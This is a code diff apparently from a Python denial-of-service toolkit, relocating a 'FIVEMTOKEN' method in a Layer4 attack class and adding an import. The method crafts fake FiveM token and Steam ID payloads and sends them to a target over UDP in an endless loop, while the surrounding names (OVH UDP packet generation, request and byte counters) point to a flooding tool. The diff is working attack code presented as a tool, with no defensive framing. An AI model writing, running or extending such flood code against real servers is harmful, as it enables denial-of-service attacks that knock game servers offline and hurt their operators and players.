@@ -15,7 +15,7 @@ from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
 from base64 import b64encode
 
 from core.tools import Tools
-from config.environment import __ip__, con
+from config.environment import __ip__, con, ctx
 from core.minecraft import Minecraft
 from core.counters import REQUESTS_SENT, BYTES_SENT
 
@@ -198,23 +198,6 @@ class Layer4(Thread):
                 continue
         Tools.safe_close(s)
 
-    def FIVEMTOKEN(self) -> None:
-        global BYTES_SENT, REQUESTS_SENT
-
-        # Generete token and guid
-        token = str(uuid4())
-        steamid_min = 76561197960265728
-        steamid_max = 76561199999999999
-        guid = str(randint(steamid_min, steamid_max))
-
-        # Build Payload
-        payload_str = f"token={token}&guid={guid}"
-        payload = payload_str.encode('utf-8')
-
-        with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target):
-                continue
-        Tools.safe_close(s)
 
     def FIVEM(self) -> None:
         global BYTES_SENT, REQUESTS_SENT
@@ -243,6 +226,24 @@ class Layer4(Thread):
                 continue
         Tools.safe_close(s)
 
+    def FIVEMTOKEN(self) -> None:
+        global BYTES_SENT, REQUESTS_SENT
+
+        # Generete token and guid
+        token = str(uuid4())
+        steamid_min = 76561197960265728
+        steamid_max = 76561199999999999
+        guid = str(randint(steamid_min, steamid_max))
+
+        # Build Payload
+        payload_str = f"token={token}&guid={guid}"
+        payload = payload_str.encode('utf-8')
+
+        with socket(AF_INET, SOCK_DGRAM) as s:
+            while Tools.sendto(s, payload, self._target):
+                continue
+        Tools.safe_close(s)
+        
     def _generate_ovhudp(self) -> List[bytes]:
         packets = []
 
